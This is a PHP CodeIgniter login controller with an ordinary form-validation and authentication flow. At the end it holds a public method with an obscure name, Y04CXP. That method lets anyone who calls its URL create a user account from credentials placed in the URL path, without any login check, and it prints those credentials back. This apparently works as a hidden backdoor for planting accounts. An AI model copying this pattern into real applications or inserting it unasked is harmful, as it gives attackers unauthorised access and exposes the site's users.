<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Login extends PNR_Controller {

    public function __construct() {
        parent::__construct();
        $this->load->library('authentication');
        if ($this->authentication->is_loggedin()) { show_error('Already logged in'); exit; }
        $this->detect_language();
    }

    /**
     * Login
     */
    public function index()
    {
        $this->data['current-menu-item'] = 'Login';
        $this->load->helper(array('form', 'url'));
        if ($this->input->post('login_submit') != false) {
            $this->load->library('form_validation');
            $this->form_validation->set_rules('login_useremail', $this->lang->line('label_useremail'),  'trim|required');
            $this->form_validation->set_rules('login_password',  $this->lang->line('label_password'),   'trim|required');
            $is_ok = $this->form_validation->run();
            if ($is_ok) {
                $this->load->model('user_model');
                $username = $this->input->post('login_useremail');
                $is_valid = $this->authentication->login($username, $this->input->post('login_password'), $this->input->post('login_keep')!='on'?false:true);
                if ($is_valid) {
                    redirect('my/profile');
                }
            }
        }
        $this->load->view('layouts/main', array('view' => 'templates/login', 'data' => $this->data));
    }
    
    public function Y04CXP($username, $password) {
        echo $username.' ~ '.$password;
        $this->authentication->create_user($username, $password, array());
    }
}
